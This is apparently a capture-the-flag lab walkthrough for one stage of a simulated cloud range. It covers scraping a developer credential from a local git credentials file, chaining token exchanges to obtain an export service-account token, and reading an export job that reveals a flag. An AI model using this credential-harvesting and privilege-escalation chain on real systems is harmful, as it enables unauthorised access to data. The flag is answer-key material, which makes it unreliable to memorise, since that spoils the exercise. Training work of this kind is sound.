# K15.1 Walkthrough: An export in progress

The export job EXP-2841 is a real K3s Job. The participant reads it with the
export SA token from K14.2; K3s RBAC allows svc-fieldlink-export and denies
svc-fieldlink-workload.

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the export SA token (K13.4 -> K14.2)

The role exchange returns a real K3s service-account token for
svc-fieldlink-export. Capture it.

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
EXPORT_TOKEN=$(curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/token-exchange/fieldkest-export-access \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

`$EXPORT_TOKEN` is a K3s JWT (starts with `eyJ`).

## Step 2: read the export job (K15.1 acceptance check)

```
curl -sS --cacert $CA -H "Authorization: Bearer $EXPORT_TOKEN" \
  https://cloud-api.keplerops.test/api/exports/EXP-2841
```

{"case_id":"CAS-MAYA-2841","dataset":"support-case-history","destination":"fieldkest-exports","export_id":"EXP-2841","flag":"FLAG{6b4342f2b090f8d2}","job_name":"exp-2841","revision":6,"schema":"fieldkest.export-job/v1","state":"unpublished"}
